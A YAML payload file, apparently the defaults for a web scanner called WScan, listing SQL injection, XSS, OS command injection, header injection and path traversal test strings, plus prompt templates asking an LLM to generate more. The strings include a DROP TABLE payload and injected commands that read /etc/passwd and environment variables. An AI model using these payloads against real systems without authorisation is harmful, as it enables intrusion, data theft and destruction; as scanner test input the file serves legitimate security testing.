@@ -1,0 +1,168 @@
+# WScan Default Payloads
+# These payloads are used when no custom payload file is specified
+# and LLM generation is unavailable or disabled.
+
+sqli:
+  # Basic detection
+  - "'"
+  - "''"
+  - "\"'"
+  # Error-based
+  - "' OR '1'='1"
+  - "' OR '1'='1' --"
+  - "' OR '1'='1' /*"
+  - "' OR '1'='1' #"
+  - "\" OR \"1\"=\"1"
+  - ") OR ('1'='1"
+  - ") OR 1=1--"
+  - "1 OR 1=1"
+  - "admin'--"
+  - "admin' #"
+  - "' OR 1=1--"
+  - "' OR 1=1#"
+  - "' OR 1=1/*"
+  # UNION-based
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL--"
+  - "-1 UNION SELECT 1,2,3--"
+  - "1' UNION ALL SELECT NULL,NULL,NULL--"
+  # ORDER BY (column count detection)
+  - "1' ORDER BY 1--"
+  - "1' ORDER BY 2--"
+  - "1' ORDER BY 3--"
+  # Blind (boolean-based)
+  - "1' AND '1'='1"
+  - "1' AND '1'='2"
+  - "1 AND 1=1"
+  - "1 AND 1=2"
+  # Time-based blind
+  - "1' AND SLEEP(3)--"
+  - "1; WAITFOR DELAY '0:0:3'--"
+  - "1' AND BENCHMARK(3000000,MD5('a'))--"
+  # Stacked queries
+  - "'; DROP TABLE users--"
+  - "1; SELECT * FROM information_schema.tables--"
+  # Version fingerprint
+  - "' AND 1=CONVERT(int,@@version)--"
+  - "' AND 1=CONVERT(int,(SELECT @@version))--"
+
+xss:
+  # Basic script injection
+  - "<script>alert('XSS')</script>"
+  - "<script>alert(document.cookie)</script>"
+  - "<script>alert(1)</script>"
+  # Attribute injection
+  - "\"'><script>alert('XSS')</script>"
+  - "'\"><script>alert('XSS')</script>"
+  - "'><img src=x onerror=alert('XSS')>"
+  # Event handlers
+  - "<img src=x onerror=alert('XSS')>"
+  - "<img src=x onerror=\"alert('XSS')\">"
+  - "<svg onload=alert('XSS')>"
+  - "<svg onload=\"alert('XSS')\">"
+  - "<body onload=alert('XSS')>"
+  - "<input autofocus onfocus=alert('XSS')>"
+  - "<details open ontoggle=alert('XSS')>"
+  - "<select autofocus onfocus=alert('XSS')>"
+  # JavaScript protocol
+  - "javascript:alert('XSS')"
+  - "JAVASCRIPT:alert('XSS')"
+  # IFrame
+  - "<iframe src=javascript:alert('XSS')>"
+  - "<iframe onload=alert('XSS')>"
+  # Filter bypass
+  - "<<SCRIPT>alert('XSS');//<</SCRIPT>"
+  - "<IMG SRC=j&#X41;vascript:alert('XSS')>"
+  - "<IMG SRC=\"jav\tascript:alert('XSS');\">"
+  - "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"
+  - "%3Cscript%3Ealert('XSS')%3C/script%3E"
+  - "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
+  # DOM XSS
+  - "#<script>alert('XSS')</script>"
+  - "';alert('XSS');//"
+  - "\";alert('XSS');//"
+
+os_injection:
+  # Unix/Linux
+  - "; ls -la"
+  - "| ls -la"
+  - "& ls -la"
+  - "&& ls -la"
+  - "; whoami"
+  - "| whoami"
+  - "& whoami"
+  - "&& whoami"
+  - "; id"
+  - "| id"
+  - "; cat /etc/passwd"
+  - "| cat /etc/passwd"
+  - "; uname -a"
+  - "| uname -a"
+  - "; env"
+  - "| env"
+  # Windows
+  - "; dir"
+  - "| dir"
+  - "& dir"
+  - "&& dir"
+  - "; whoami"
+  - "| type C:\\Windows\\win.ini"
+  - "& type C:\\Windows\\win.ini"
+  - "; ipconfig"
+  - "| ipconfig"
+  # Command substitution
+  - "`whoami`"
+  - "$(whoami)"
+  - "`id`"
+  - "$(id)"
+  - "`cat /etc/passwd`"
+  # Newline injection
+  - "\n whoami"
+  - "\r\n whoami"
+  # Blind (time-based)
+  - "; ping -c 3 127.0.0.1"
+  - "| ping -c 3 127.0.0.1"
+  - "& ping -n 3 127.0.0.1"
+  - "; sleep 3"
+  - "| sleep 3"
+
+header_injection:
+  - "\r\nX-Injected: wscan"
+  - "%0d%0aX-Injected: wscan"
+  - "%0aX-Injected: wscan"
+  - "\nX-Injected: wscan"
+  - "\r\nSet-Cookie: session=injected"
+
+path_traversal:
+  - "../../../etc/passwd"
+  - "../../etc/passwd"
+  - "../etc/passwd"
+  - "..%2F..%2F..%2Fetc%2Fpasswd"
+  - "..%2f..%2f..%2fetc%2fpasswd"
+  - "....//....//....//etc//passwd"
+  - "..\\..\\..\\windows\\win.ini"
+  - "..%5C..%5C..%5Cwindows%5Cwin.ini"
+  - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  - "%252e%252e%252fetc%252fpasswd"
+  - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+
+# LLM prompt templates for context-aware payload generation
+llm_prompts:
+  sqli: |
+    You are a web security expert. Generate SQL injection test payloads for a field named "{field_name}"
+    on endpoint "{url}". Consider the field context and generate 5 diverse payloads that test for:
+    1. Error-based SQLi
+    2. Boolean-based blind SQLi
+    3. Time-based blind SQLi
+    Output ONLY a JSON array of strings, nothing else. Example: ["payload1", "payload2"]
+
+  xss: |
+    You are a web security expert. Generate XSS test payloads for a field named "{field_name}"
+    on endpoint "{url}". Generate 5 diverse payloads that test reflected and stored XSS.
+    Consider filter bypasses. Output ONLY a JSON array of strings, nothing else.
+
+  os: |
+    You are a web security expert. Generate OS command injection test payloads for a field named
+    "{field_name}" on endpoint "{url}". Generate 5 payloads for both Unix and Windows systems.
+    Output ONLY a JSON array of strings, nothing else.
